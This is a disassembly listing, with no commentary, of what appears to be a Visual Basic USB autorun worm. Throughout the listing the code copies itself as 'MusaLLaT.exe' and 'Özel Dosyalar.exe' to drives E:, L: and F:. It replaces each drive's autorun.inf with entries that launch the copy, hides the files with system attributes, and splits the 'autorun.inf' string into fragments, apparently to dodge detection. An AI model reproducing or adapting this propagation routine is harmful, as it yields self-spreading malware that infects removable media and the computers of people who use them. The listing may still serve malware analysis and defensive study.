  mov eax, var_12C
  mov ecx, [eax]
  mov edx, var_12C
  push edx
  call [ecx+00000050h]
  fnclex
  mov var_130, eax
  cmp var_130, 00000000h
  jge 0043DFF1h
  push 00000050h
  push 00418EF0h
  mov eax, var_12C
  push eax
  mov ecx, var_130
  push ecx
  call [00401058h]
  mov var_160, eax
  jmp 0043DFFBh
  mov var_160, 00000000h
  cmp [00460558h], 00000000h
  jnz 0043E020h
  push 00460558h
  push 00418EE0h
  call [00401134h]
  mov var_164, 00460558h
  jmp 0043E02Ah
  mov var_164, 00460558h
  mov edx, var_164
  mov eax, [edx]
  mov var_134, eax
  lea ecx, var_C0
  push ecx
  mov edx, var_134
  mov eax, [edx]
  mov ecx, var_134
  push ecx
  call [eax+00000014h]
  fnclex
  mov var_138, eax
  cmp var_138, 00000000h
  jge 0043E085h
  push 00000014h
  push 00418ED0h
  mov edx, var_134
  push edx
  mov eax, var_138
  push eax
  call [00401058h]
  mov var_168, eax
  jmp 0043E08Fh
  mov var_168, 00000000h
  mov ecx, var_C0
  mov var_13C, ecx
  lea edx, var_A8
  push edx
  mov eax, var_13C
  mov ecx, [eax]
  mov edx, var_13C
  push edx
  call [ecx+00000058h]
  fnclex
  mov var_140, eax
  cmp var_140, 00000000h
  jge 0043E0E8h
  push 00000058h
  push 00418EF0h
  mov eax, var_13C
  push eax
  mov ecx, var_140
  push ecx
  call [00401058h]
  mov var_16C, eax
  jmp 0043E0F2h
  mov var_16C, 00000000h
  push 0041931Ch ; "E:\MusaLLaT.exe"
  mov edx, var_A4
  push edx
  push 00418DA4h ; "\"
  call [00401044h]
  mov edx, eax
  lea ecx, var_AC
  call [004011ACh]
  push eax
  mov eax, var_A8
  push eax
  call [00401044h]
  mov edx, eax
  lea ecx, var_B0
  call [004011ACh]
  push eax
  push 004192E0h ; ".exe"
  call [00401044h]
  mov edx, eax
  lea ecx, var_B4
  call [004011ACh]
  push eax
  call [00401158h]
  lea ecx, var_B4
  push ecx
  lea edx, var_B0
  push edx
  lea eax, var_A8
  push eax
  lea ecx, var_AC
  push ecx
  lea edx, var_A4
  push edx
  push 00000005h
  call [00401150h]
  add esp, 00000018h
  lea eax, var_C0
  push eax
  lea ecx, var_BC
  push ecx
  push 00000002h
  call [0040102Ch]
  add esp, 0000000Ch
  mov var_4, 00000005h
  mov var_F8, 00419340h ; "E:\Özel Dosyalar.exe"
  mov var_100, 00000008h
  lea edx, var_100
  lea ecx, var_D0
  call [0040118Ch]
  push 00000000h
  lea edx, var_D0
  push edx
  call [00401120h]
  mov edx, eax
  lea ecx, var_A4
  call [004011ACh]
  push eax
  push 00418DE4h
  call [004010B0h]
  neg eax
  sbb eax, eax
  neg eax
  neg eax
  mov var_118, ax
  mov var_120, 0000000Bh
  mov var_108, 00000000h
  mov var_110, 0000800Bh
  lea eax, var_120
  push eax
  lea ecx, var_70
  push ecx
  lea edx, var_110
  push edx
  lea eax, var_E0
  push eax
  call [00401174h]
  push eax
  lea ecx, var_F0
  push ecx
  call [004010E4h]
  push eax
  call [00401090h]
  mov var_124, ax
  lea ecx, var_A4
  call [004011CCh]
  lea edx, var_120
  push edx
  lea eax, var_D0
  push eax
  push 00000002h
  call [00401024h]
  add esp, 0000000Ch
  movsx ecx, var_124
  test ecx, ecx
  jz 0043E28Eh
  jmp 0043E52Ch
  mov var_4, 00000007h
  cmp [00460558h], 00000000h
  jnz 0043E2BAh
  push 00460558h
  push 00418EE0h
  call [00401134h]
  mov var_170, 00460558h
  jmp 0043E2C4h
  mov var_170, 00460558h
  mov edx, var_170
  mov eax, [edx]
  mov var_124, eax
  lea ecx, var_BC
  push ecx
  mov edx, var_124
  mov eax, [edx]
  mov ecx, var_124
  push ecx
  call [eax+00000014h]
  fnclex
  mov var_128, eax
  cmp var_128, 00000000h
  jge 0043E31Fh
  push 00000014h
  push 00418ED0h
  mov edx, var_124
  push edx
  mov eax, var_128
  push eax
  call [00401058h]
  mov var_174, eax
  jmp 0043E329h
  mov var_174, 00000000h
  mov ecx, var_BC
  mov var_12C, ecx
  lea edx, var_A4
  push edx
  mov eax, var_12C
  mov ecx, [eax]
  mov edx, var_12C
  push edx
  call [ecx+00000050h]
  fnclex
  mov var_130, eax
  cmp var_130, 00000000h
  jge 0043E382h
  push 00000050h
  push 00418EF0h
  mov eax, var_12C
  push eax
  mov ecx, var_130
  push ecx
  call [00401058h]
  mov var_178, eax
  jmp 0043E38Ch
  mov var_178, 00000000h
  cmp [00460558h], 00000000h
  jnz 0043E3B1h
  push 00460558h
  push 00418EE0h
  call [00401134h]
  mov var_17C, 00460558h
  jmp 0043E3BBh
  mov var_17C, 00460558h
  mov edx, var_17C
  mov eax, [edx]
  mov var_134, eax
  lea ecx, var_C0
  push ecx
  mov edx, var_134
  mov eax, [edx]
  mov ecx, var_134
  push ecx
  call [eax+00000014h]
  fnclex
  mov var_138, eax
  cmp var_138, 00000000h
  jge 0043E416h
  push 00000014h
  push 00418ED0h
  mov edx, var_134
  push edx
  mov eax, var_138
  push eax
  call [00401058h]
  mov var_180, eax
  jmp 0043E420h
  mov var_180, 00000000h
  mov ecx, var_C0
  mov var_13C, ecx
  lea edx, var_A8
  push edx
  mov eax, var_13C
  mov ecx, [eax]
  mov edx, var_13C
  push edx
  call [ecx+00000058h]
  fnclex
  mov var_140, eax
  cmp var_140, 00000000h
  jge 0043E479h
  push 00000058h
  push 00418EF0h
  mov eax, var_13C
  push eax
  mov ecx, var_140
  push ecx
  call [00401058h]
  mov var_184, eax
  jmp 0043E483h
  mov var_184, 00000000h
  push 00419340h ; "E:\Özel Dosyalar.exe"
  mov edx, var_A4
  push edx
  push 00418DA4h ; "\"
  call [00401044h]
  mov edx, eax
  lea ecx, var_AC
  call [004011ACh]
  push eax
  mov eax, var_A8
  push eax
  call [00401044h]
  mov edx, eax
  lea ecx, var_B0
  call [004011ACh]
  push eax
  push 004192E0h ; ".exe"
  call [00401044h]
  mov edx, eax
  lea ecx, var_B4
  call [004011ACh]
  push eax
  call [00401158h]
  lea ecx, var_B4
  push ecx
  lea edx, var_B0
  push edx
  lea eax, var_A8
  push eax
  lea ecx, var_AC
  push ecx
  lea edx, var_A4
  push edx
  push 00000005h
  call [00401150h]
  add esp, 00000018h
  lea eax, var_C0
  push eax
  lea ecx, var_BC
  push ecx
  push 00000002h
  call [0040102Ch]
  add esp, 0000000Ch
  mov var_4, 00000009h
  push 00419370h ; "E:\a"
  push 00419380h ; "ut"
  call [00401044h]
  mov edx, eax
  lea ecx, var_A4
  call [004011ACh]
  push eax
  push 0041938Ch ; "or"
  call [00401044h]
  mov edx, eax
  lea ecx, var_A8
  call [004011ACh]
  push eax
  push 00419398h ; "un."
  call [00401044h]
  mov edx, eax
  lea ecx, var_AC
  call [004011ACh]
  push eax
  push 004193A4h
  call [00401044h]
  mov edx, eax
  lea ecx, var_B0
  call [004011ACh]
  push eax
  push 004193ACh ; "nf"
  call [00401044h]
  mov edx, eax
  lea ecx, var_B4
  call [004011ACh]
  push eax
  call [00401110h]
  lea edx, var_B4
  push edx
  lea eax, var_B0
  push eax
  lea ecx, var_AC
  push ecx
  lea edx, var_A8
  push edx
  lea eax, var_A4
  push eax
  push 00000005h
  call [00401150h]
  add esp, 00000018h
  mov var_4, 0000000Ah
  push 00419370h ; "E:\a"
  push 00419380h ; "ut"
  call [00401044h]
  mov edx, eax
  lea ecx, var_A4
  call [004011ACh]
  push eax
  push 0041938Ch ; "or"
  call [00401044h]
  mov edx, eax
  lea ecx, var_A8
  call [004011ACh]
  push eax
  push 00419398h ; "un."
  call [00401044h]
  mov edx, eax
  lea ecx, var_AC
  call [004011ACh]
  push eax
  push 004193A4h
  call [00401044h]
  mov edx, eax
  lea ecx, var_B0
  call [004011ACh]
  push eax
  push 004193ACh ; "nf"
  call [00401044h]
  mov edx, eax
  lea ecx, var_B4
  call [004011ACh]
  push eax
  lea ecx, var_B8
  push ecx
  call [00401188h]
  push eax
  call 00419468h ; DeleteFile(%x1v)
  call [00401054h]
  lea edx, var_B8
  push edx
  lea eax, var_B4
  push eax
  lea ecx, var_B0
  push ecx
  lea edx, var_AC
  push edx
  lea eax, var_A8
  push eax
  lea ecx, var_A4
  push ecx
  push 00000006h
  call [00401150h]
  add esp, 0000001Ch
  mov var_4, 0000000Bh
  push 00419370h ; "E:\a"
  push 00419380h ; "ut"
  call [00401044h]
  mov edx, eax
  lea ecx, var_A4
  call [004011ACh]
  push eax
  push 0041938Ch ; "or"
  call [00401044h]
  mov edx, eax
  lea ecx, var_A8
  call [004011ACh]
  push eax
  push 00419398h ; "un."
  call [00401044h]
  mov edx, eax
  lea ecx, var_AC
  call [004011ACh]
  push eax
  push 004193A4h
  call [00401044h]
  mov edx, eax
  lea ecx, var_B0
  call [004011ACh]
  push eax
  push 004193ACh ; "nf"
  call [00401044h]
  mov edx, eax
  lea ecx, var_B4
  call [004011ACh]
  push eax
  push 00000001h
  push FFFFFFFFh
  push 00000002h
  call [0040112Ch]
  lea edx, var_B4
  push edx
  lea eax, var_B0
  push eax
  lea ecx, var_AC
  push ecx
  lea edx, var_A8
  push edx
  lea eax, var_A4
  push eax
  push 00000005h
  call [00401150h]
  add esp, 00000018h
  mov var_4, 0000000Ch
  push 00419488h ; "[AutoRun]"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 0000000Dh
  push 004194A8h ; "Open=MusaLLaT.exe"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 0000000Eh
  push 004194D0h ; "Shell\Open=Aç"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 0000000Fh
  push 004194F0h ; "Shell\Open\Command=MusaLLaT.exe"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 00000010h
  push 00000001h
  call [004010A0h]
  mov var_4, 00000011h
  push 00000006h
  push 0041931Ch ; "E:\MusaLLaT.exe"
  call [004011D0h]
  mov var_4, 00000012h
  push 00000006h
  push 00419370h ; "E:\a"
  push 00419380h ; "ut"
  call [00401044h]
  mov edx, eax
  lea ecx, var_A4
  call [004011ACh]
  push eax
  push 0041938Ch ; "or"
  call [00401044h]
  mov edx, eax
  lea ecx, var_A8
  call [004011ACh]
  push eax
  push 00419398h ; "un."
  call [00401044h]
  mov edx, eax
  lea ecx, var_AC
  call [004011ACh]
  push eax
  push 004193A4h
  call [00401044h]
  mov edx, eax
  lea ecx, var_B0
  call [004011ACh]
  push eax
  push 004193ACh ; "nf"
  call [00401044h]
  mov edx, eax
  lea ecx, var_B4
  call [004011ACh]
  push eax
  call [004011D0h]
  lea ecx, var_B4
  push ecx
  lea edx, var_B0
  push edx
  lea eax, var_AC
  push eax
  lea ecx, var_A8
  push ecx
  lea edx, var_A4
  push edx
  push 00000005h
  call [00401150h]
  add esp, 00000018h
  mov var_4, 00000013h
  mov var_F8, FFFFFFFFh
  mov var_100, 0000000Bh
  lea edx, var_100
  lea ecx, var_70
  call [00401010h]
  mov var_4, 00000015h
  mov var_F8, 00419534h ; "L:\"
  mov var_100, 00000008h
  lea edx, var_100
  lea ecx, var_D0
  call [0040118Ch]
  push 00000000h
  lea eax, var_D0
  push eax
  call [00401120h]
  mov edx, eax
  lea ecx, var_A4
  call [004011ACh]
  push eax
  push 00418DE4h
  call [004010B0h]
  neg eax
  sbb eax, eax
  neg eax
  neg eax
  mov var_118, ax
  mov var_120, 0000000Bh
  mov var_108, 00000000h
  mov var_110, 0000800Bh
  lea ecx, var_120
  push ecx
  lea edx, var_60
  push edx
  lea eax, var_110
  push eax
  lea ecx, var_E0
  push ecx
  call [00401174h]
  push eax
  lea edx, var_F0
  push edx
  call [004010E4h]
  push eax
  call [00401090h]
  mov var_124, ax
  lea ecx, var_A4
  call [004011CCh]
  lea eax, var_120
  push eax
  lea ecx, var_D0
  push ecx
  push 00000002h
  call [00401024h]
  add esp, 0000000Ch
  movsx edx, var_124
  test edx, edx
  jz 0043F41Bh
  mov var_4, 00000016h
  cmp [00460558h], 00000000h
  jnz 0043EA31h
  push 00460558h
  push 00418EE0h
  call [00401134h]
  mov var_188, 00460558h
  jmp 0043EA3Bh
  mov var_188, 00460558h
  mov eax, var_188
  mov ecx, [eax]
  mov var_124, ecx
  lea edx, var_BC
  push edx
  mov eax, var_124
  mov ecx, [eax]
  mov edx, var_124
  push edx
  call [ecx+00000014h]
  fnclex
  mov var_128, eax
  cmp var_128, 00000000h
  jge 0043EA96h
  push 00000014h
  push 00418ED0h
  mov eax, var_124
  push eax
  mov ecx, var_128
  push ecx
  call [00401058h]
  mov var_18C, eax
  jmp 0043EAA0h
  mov var_18C, 00000000h
  mov edx, var_BC
  mov var_12C, edx
  lea eax, var_A4
  push eax
  mov ecx, var_12C
  mov edx, [ecx]
  mov eax, var_12C
  push eax
  call [edx+00000050h]
  fnclex
  mov var_130, eax
  cmp var_130, 00000000h
  jge 0043EAF9h
  push 00000050h
  push 00418EF0h
  mov ecx, var_12C
  push ecx
  mov edx, var_130
  push edx
  call [00401058h]
  mov var_190, eax
  jmp 0043EB03h
  mov var_190, 00000000h
  cmp [00460558h], 00000000h
  jnz 0043EB28h
  push 00460558h
  push 00418EE0h
  call [00401134h]
  mov var_194, 00460558h
  jmp 0043EB32h
  mov var_194, 00460558h
  mov eax, var_194
  mov ecx, [eax]
  mov var_134, ecx
  lea edx, var_C0
  push edx
  mov eax, var_134
  mov ecx, [eax]
  mov edx, var_134
  push edx
  call [ecx+00000014h]
  fnclex
  mov var_138, eax
  cmp var_138, 00000000h
  jge 0043EB8Dh
  push 00000014h
  push 00418ED0h
  mov eax, var_134
  push eax
  mov ecx, var_138
  push ecx
  call [00401058h]
  mov var_198, eax
  jmp 0043EB97h
  mov var_198, 00000000h
  mov edx, var_C0
  mov var_13C, edx
  lea eax, var_A8
  push eax
  mov ecx, var_13C
  mov edx, [ecx]
  mov eax, var_13C
  push eax
  call [edx+00000058h]
  fnclex
  mov var_140, eax
  cmp var_140, 00000000h
  jge 0043EBF0h
  push 00000058h
  push 00418EF0h
  mov ecx, var_13C
  push ecx
  mov edx, var_140
  push edx
  call [00401058h]
  mov var_19C, eax
  jmp 0043EBFAh
  mov var_19C, 00000000h
  push 00419540h ; "L:\MusaLLaT.exe"
  mov eax, var_A4
  push eax
  push 00418DA4h ; "\"
  call [00401044h]
  mov edx, eax
  lea ecx, var_AC
  call [004011ACh]
  push eax
  mov ecx, var_A8
  push ecx
  call [00401044h]
  mov edx, eax
  lea ecx, var_B0
  call [004011ACh]
  push eax
  push 004192E0h ; ".exe"
  call [00401044h]
  mov edx, eax
  lea ecx, var_B4
  call [004011ACh]
  push eax
  call [00401158h]
  lea edx, var_B4
  push edx
  lea eax, var_B0
  push eax
  lea ecx, var_A8
  push ecx
  lea edx, var_AC
  push edx
  lea eax, var_A4
  push eax
  push 00000005h
  call [00401150h]
  add esp, 00000018h
  lea ecx, var_C0
  push ecx
  lea edx, var_BC
  push edx
  push 00000002h
  call [0040102Ch]
  add esp, 0000000Ch
  mov var_4, 00000017h
  mov var_F8, 00419564h ; "L:\Özel Dosyalar.exe"
  mov var_100, 00000008h
  lea edx, var_100
  lea ecx, var_D0
  call [0040118Ch]
  push 00000000h
  lea eax, var_D0
  push eax
  call [00401120h]
  mov edx, eax
  lea ecx, var_A4
  call [004011ACh]
  push eax
  push 00418DE4h
  call [004010B0h]
  neg eax
  sbb eax, eax
  neg eax
  neg eax
  mov var_118, ax
  mov var_120, 0000000Bh
  mov var_108, 00000000h
  mov var_110, 0000800Bh
  lea ecx, var_120
  push ecx
  lea edx, var_60
  push edx
  lea eax, var_110
  push eax
  lea ecx, var_E0
  push ecx
  call [00401174h]
  push eax
  lea edx, var_F0
  push edx
  call [004010E4h]
  push eax
  call [00401090h]
  mov var_124, ax
  lea ecx, var_A4
  call [004011CCh]
  lea eax, var_120
  push eax
  lea ecx, var_D0
  push ecx
  push 00000002h
  call [00401024h]
  add esp, 0000000Ch
  movsx edx, var_124
  test edx, edx
  jz 0043ED96h
  jmp 0043F034h
  mov var_4, 00000019h
  cmp [00460558h], 00000000h
  jnz 0043EDC2h
  push 00460558h
  push 00418EE0h
  call [00401134h]
  mov var_1A0, 00460558h
  jmp 0043EDCCh
  mov var_1A0, 00460558h
  mov eax, var_1A0
  mov ecx, [eax]
  mov var_124, ecx
  lea edx, var_BC
  push edx
  mov eax, var_124
  mov ecx, [eax]
  mov edx, var_124
  push edx
  call [ecx+00000014h]
  fnclex
  mov var_128, eax
  cmp var_128, 00000000h
  jge 0043EE27h
  push 00000014h
  push 00418ED0h
  mov eax, var_124
  push eax
  mov ecx, var_128
  push ecx
  call [00401058h]
  mov var_1A4, eax
  jmp 0043EE31h
  mov var_1A4, 00000000h
  mov edx, var_BC
  mov var_12C, edx
  lea eax, var_A4
  push eax
  mov ecx, var_12C
  mov edx, [ecx]
  mov eax, var_12C
  push eax
  call [edx+00000050h]
  fnclex
  mov var_130, eax
  cmp var_130, 00000000h
  jge 0043EE8Ah
  push 00000050h
  push 00418EF0h
  mov ecx, var_12C
  push ecx
  mov edx, var_130
  push edx
  call [00401058h]
  mov var_1A8, eax
  jmp 0043EE94h
  mov var_1A8, 00000000h
  cmp [00460558h], 00000000h
  jnz 0043EEB9h
  push 00460558h
  push 00418EE0h
  call [00401134h]
  mov var_1AC, 00460558h
  jmp 0043EEC3h
  mov var_1AC, 00460558h
  mov eax, var_1AC
  mov ecx, [eax]
  mov var_134, ecx
  lea edx, var_C0
  push edx
  mov eax, var_134
  mov ecx, [eax]
  mov edx, var_134
  push edx
  call [ecx+00000014h]
  fnclex
  mov var_138, eax
  cmp var_138, 00000000h
  jge 0043EF1Eh
  push 00000014h
  push 00418ED0h
  mov eax, var_134
  push eax
  mov ecx, var_138
  push ecx
  call [00401058h]
  mov var_1B0, eax
  jmp 0043EF28h
  mov var_1B0, 00000000h
  mov edx, var_C0
  mov var_13C, edx
  lea eax, var_A8
  push eax
  mov ecx, var_13C
  mov edx, [ecx]
  mov eax, var_13C
  push eax
  call [edx+00000058h]
  fnclex
  mov var_140, eax
  cmp var_140, 00000000h
  jge 0043EF81h
  push 00000058h
  push 00418EF0h
  mov ecx, var_13C
  push ecx
  mov edx, var_140
  push edx
  call [00401058h]
  mov var_1B4, eax
  jmp 0043EF8Bh
  mov var_1B4, 00000000h
  push 00419564h ; "L:\Özel Dosyalar.exe"
  mov eax, var_A4
  push eax
  push 00418DA4h ; "\"
  call [00401044h]
  mov edx, eax
  lea ecx, var_AC
  call [004011ACh]
  push eax
  mov ecx, var_A8
  push ecx
  call [00401044h]
  mov edx, eax
  lea ecx, var_B0
  call [004011ACh]
  push eax
  push 004192E0h ; ".exe"
  call [00401044h]
  mov edx, eax
  lea ecx, var_B4
  call [004011ACh]
  push eax
  call [00401158h]
  lea edx, var_B4
  push edx
  lea eax, var_B0
  push eax
  lea ecx, var_A8
  push ecx
  lea edx, var_AC
  push edx
  lea eax, var_A4
  push eax
  push 00000005h
  call [00401150h]
  add esp, 00000018h
  lea ecx, var_C0
  push ecx
  lea edx, var_BC
  push edx
  push 00000002h
  call [0040102Ch]
  add esp, 0000000Ch
  mov var_4, 0000001Bh
  push 00419594h ; "L:\a"
  push 00419380h ; "ut"
  call [00401044h]
  mov edx, eax
  lea ecx, var_A4
  call [004011ACh]
  push eax
  push 0041938Ch ; "or"
  call [00401044h]
  mov edx, eax
  lea ecx, var_A8
  call [004011ACh]
  push eax
  push 00419398h ; "un."
  call [00401044h]
  mov edx, eax
  lea ecx, var_AC
  call [004011ACh]
  push eax
  push 004193A4h
  call [00401044h]
  mov edx, eax
  lea ecx, var_B0
  call [004011ACh]
  push eax
  push 004193ACh ; "nf"
  call [00401044h]
  mov edx, eax
  lea ecx, var_B4
  call [004011ACh]
  push eax
  call [00401110h]
  lea eax, var_B4
  push eax
  lea ecx, var_B0
  push ecx
  lea edx, var_AC
  push edx
  lea eax, var_A8
  push eax
  lea ecx, var_A4
  push ecx
  push 00000005h
  call [00401150h]
  add esp, 00000018h
  mov var_4, 0000001Ch
  push 00419594h ; "L:\a"
  push 00419380h ; "ut"
  call [00401044h]
  mov edx, eax
  lea ecx, var_A4
  call [004011ACh]
  push eax
  push 0041938Ch ; "or"
  call [00401044h]
  mov edx, eax
  lea ecx, var_A8
  call [004011ACh]
  push eax
  push 00419398h ; "un."
  call [00401044h]
  mov edx, eax
  lea ecx, var_AC
  call [004011ACh]
  push eax
  push 004193A4h
  call [00401044h]
  mov edx, eax
  lea ecx, var_B0
  call [004011ACh]
  push eax
  push 004193ACh ; "nf"
  call [00401044h]
  mov edx, eax
  lea ecx, var_B4
  call [004011ACh]
  push eax
  lea edx, var_B8
  push edx
  call [00401188h]
  push eax
  call 00419468h ; DeleteFile(%x1v)
  call [00401054h]
  lea eax, var_B8
  push eax
  lea ecx, var_B4
  push ecx
  lea edx, var_B0
  push edx
  lea eax, var_AC
  push eax
  lea ecx, var_A8
  push ecx
  lea edx, var_A4
  push edx
  push 00000006h
  call [00401150h]
  add esp, 0000001Ch
  mov var_4, 0000001Dh
  push 00419594h ; "L:\a"
  push 00419380h ; "ut"
  call [00401044h]
  mov edx, eax
  lea ecx, var_A4
  call [004011ACh]
  push eax
  push 0041938Ch ; "or"
  call [00401044h]
  mov edx, eax
  lea ecx, var_A8
  call [004011ACh]
  push eax
  push 00419398h ; "un."
  call [00401044h]
  mov edx, eax
  lea ecx, var_AC
  call [004011ACh]
  push eax
  push 004193A4h
  call [00401044h]
  mov edx, eax
  lea ecx, var_B0
  call [004011ACh]
  push eax
  push 004193ACh ; "nf"
  call [00401044h]
  mov edx, eax
  lea ecx, var_B4
  call [004011ACh]
  push eax
  push 00000001h
  push FFFFFFFFh
  push 00000002h
  call [0040112Ch]
  lea eax, var_B4
  push eax
  lea ecx, var_B0
  push ecx
  lea edx, var_AC
  push edx
  lea eax, var_A8
  push eax
  lea ecx, var_A4
  push ecx
  push 00000005h
  call [00401150h]
  add esp, 00000018h
  mov var_4, 0000001Eh
  push 00419488h ; "[AutoRun]"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 0000001Fh
  push 004194A8h ; "Open=MusaLLaT.exe"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 00000020h
  push 004194D0h ; "Shell\Open=Aç"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 00000021h
  push 004194F0h ; "Shell\Open\Command=MusaLLaT.exe"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 00000022h
  push 00000001h
  call [004010A0h]
  mov var_4, 00000023h
  push 00000006h
  push 00419540h ; "L:\MusaLLaT.exe"
  call [004011D0h]
  mov var_4, 00000024h
  push 00000006h
  push 00419594h ; "L:\a"
  push 00419380h ; "ut"
  call [00401044h]
  mov edx, eax
  lea ecx, var_A4
  call [004011ACh]
  push eax
  push 0041938Ch ; "or"
  call [00401044h]
  mov edx, eax
  lea ecx, var_A8
  call [004011ACh]
  push eax
  push 00419398h ; "un."
  call [00401044h]
  mov edx, eax
  lea ecx, var_AC
  call [004011ACh]
  push eax
  push 004193A4h
  call [00401044h]
  mov edx, eax
  lea ecx, var_B0
  call [004011ACh]
  push eax
  push 004193ACh ; "nf"
  call [00401044h]
  mov edx, eax
  lea ecx, var_B4
  call [004011ACh]
  push eax
  call [004011D0h]
  lea edx, var_B4
  push edx
  lea eax, var_B0
  push eax
  lea ecx, var_AC
  push ecx
  lea edx, var_A8
  push edx
  lea eax, var_A4
  push eax
  push 00000005h
  call [00401150h]
  add esp, 00000018h
  mov var_4, 00000025h
  mov var_F8, FFFFFFFFh
  mov var_100, 0000000Bh
  lea edx, var_100
  lea ecx, var_60
  call [00401010h]
  mov var_4, 00000027h
  mov var_F8, 004195A4h ; "F:\"
  mov var_100, 00000008h
  lea edx, var_100
  lea ecx, var_D0
  call [0040118Ch]
  push 00000000h
  lea ecx, var_D0
  push ecx
  call [00401120h]
  mov edx, eax
  lea ecx, var_A4
  call [004011ACh]
  push eax
  push 00418DE4h
  call [004010B0h]
  neg eax
  sbb eax, eax
  neg eax
  neg eax
  mov var_118, ax
  mov var_120, 0000000Bh
  mov var_108, 00000000h
  mov var_110, 0000800Bh
  lea edx, var_120
  push edx
  lea eax, var_80
  push eax
  lea ecx, var_110
  push ecx
  lea edx, var_E0
  push edx
  call [00401174h]
  push eax
  lea eax, var_F0
  push eax
  call [004010E4h]
  push eax
  call [00401090h]
  mov var_124, ax
  lea ecx, var_A4
  call [004011CCh]
  lea ecx, var_120
  push ecx
  lea edx, var_D0
  push edx
  push 00000002h
  call [00401024h]
  add esp, 0000000Ch
  movsx eax, var_124
  test eax, eax
  jz 0043FF23h
  mov var_4, 00000028h
  cmp [00460558h], 00000000h
  jnz 0043F539h
  push 00460558h
  push 00418EE0h
  call [00401134h]
  mov var_1B8, 00460558h
  jmp 0043F543h
  mov var_1B8, 00460558h
  mov ecx, var_1B8
  mov edx, [ecx]
  mov var_124, edx
  lea eax, var_BC
  push eax
  mov ecx, var_124
  mov edx, [ecx]
  mov eax, var_124
  push eax
  call [edx+00000014h]
  fnclex
  mov var_128, eax
  cmp var_128, 00000000h
  jge 0043F59Eh
  push 00000014h
  push 00418ED0h
  mov ecx, var_124
  push ecx
  mov edx, var_128
  push edx
  call [00401058h]
  mov var_1BC, eax
  jmp 0043F5A8h
  mov var_1BC, 00000000h
  mov eax, var_BC
  mov var_12C, eax
  lea ecx, var_A4
  push ecx
  mov edx, var_12C
  mov eax, [edx]
  mov ecx, var_12C
  push ecx
  call [eax+00000050h]
  fnclex
  mov var_130, eax
  cmp var_130, 00000000h
  jge 0043F601h
  push 00000050h
  push 00418EF0h
  mov edx, var_12C
  push edx
  mov eax, var_130
  push eax
  call [00401058h]
  mov var_1C0, eax
  jmp 0043F60Bh
  mov var_1C0, 00000000h
  cmp [00460558h], 00000000h
  jnz 0043F630h
  push 00460558h
  push 00418EE0h
  call [00401134h]
  mov var_1C4, 00460558h
  jmp 0043F63Ah
  mov var_1C4, 00460558h
  mov ecx, var_1C4
  mov edx, [ecx]
  mov var_134, edx
  lea eax, var_C0
  push eax
  mov ecx, var_134
  mov edx, [ecx]
  mov eax, var_134
  push eax
  call [edx+00000014h]
  fnclex
  mov var_138, eax
  cmp var_138, 00000000h
  jge 0043F695h
  push 00000014h
  push 00418ED0h
  mov ecx, var_134
  push ecx
  mov edx, var_138
  push edx
  call [00401058h]
  mov var_1C8, eax
  jmp 0043F69Fh
  mov var_1C8, 00000000h
  mov eax, var_C0
  mov var_13C, eax
  lea ecx, var_A8
  push ecx
  mov edx, var_13C
  mov eax, [edx]
  mov ecx, var_13C
  push ecx
  call [eax+00000058h]
  fnclex
  mov var_140, eax
  cmp var_140, 00000000h
  jge 0043F6F8h
  push 00000058h
  push 00418EF0h
  mov edx, var_13C
  push edx
  mov eax, var_140
  push eax
  call [00401058h]
  mov var_1CC, eax
  jmp 0043F702h
  mov var_1CC, 00000000h
  push 004195B0h ; "F:\MusaLLaT.exe"
  mov ecx, var_A4
  push ecx
  push 00418DA4h ; "\"
  call [00401044h]
  mov edx, eax
  lea ecx, var_AC
  call [004011ACh]
  push eax
  mov edx, var_A8
  push edx
  call [00401044h]
  mov edx, eax
  lea ecx, var_B0
  call [004011ACh]
  push eax
  push 004192E0h ; ".exe"
  call [00401044h]
  mov edx, eax
  lea ecx, var_B4
  call [004011ACh]
  push eax
  call [00401158h]
  lea eax, var_B4
  push eax
  lea ecx, var_B0
  push ecx
  lea edx, var_A8
  push edx
  lea eax, var_AC
  push eax
  lea ecx, var_A4
  push ecx
  push 00000005h
  call [00401150h]
  add esp, 00000018h
  lea edx, var_C0
  push edx
  lea eax, var_BC
  push eax
  push 00000002h
  call [0040102Ch]
  add esp, 0000000Ch
  mov var_4, 00000029h
  mov var_F8, 004195D8h ; "F:\Özel Dosyalar.exe"
  mov var_100, 00000008h
  lea edx, var_100
  lea ecx, var_D0
  call [0040118Ch]
  push 00000000h
  lea ecx, var_D0
  push ecx
  call [00401120h]
  mov edx, eax
  lea ecx, var_A4
  call [004011ACh]
  push eax
  push 00418DE4h
  call [004010B0h]
  neg eax
  sbb eax, eax
  neg eax
  neg eax
  mov var_118, ax
  mov var_120, 0000000Bh
  mov var_108, 00000000h
  mov var_110, 0000800Bh
  lea edx, var_120
  push edx
  lea eax, var_80
  push eax
  lea ecx, var_110
  push ecx
  lea edx, var_E0
  push edx
  call [00401174h]
  push eax
  lea eax, var_F0
  push eax
  call [004010E4h]
  push eax
  call [00401090h]
  mov var_124, ax
  lea ecx, var_A4
  call [004011CCh]
  lea ecx, var_120
  push ecx
  lea edx, var_D0
  push edx
  push 00000002h
  call [00401024h]
  add esp, 0000000Ch
  movsx eax, var_124
  test eax, eax
  jz 0043F89Eh
  jmp 0043FB3Ch
  mov var_4, 0000002Bh
  cmp [00460558h], 00000000h
  jnz 0043F8CAh
  push 00460558h
  push 00418EE0h
  call [00401134h]
  mov var_1D0, 00460558h
  jmp 0043F8D4h
  mov var_1D0, 00460558h
  mov ecx, var_1D0
  mov edx, [ecx]
  mov var_124, edx
  lea eax, var_BC
  push eax
  mov ecx, var_124
  mov edx, [ecx]
  mov eax, var_124
  push eax
  call [edx+00000014h]
  fnclex
  mov var_128, eax
  cmp var_128, 00000000h
  jge 0043F92Fh
  push 00000014h
  push 00418ED0h
  mov ecx, var_124
  push ecx
  mov edx, var_128
  push edx
  call [00401058h]
  mov var_1D4, eax
  jmp 0043F939h
  mov var_1D4, 00000000h
  mov eax, var_BC
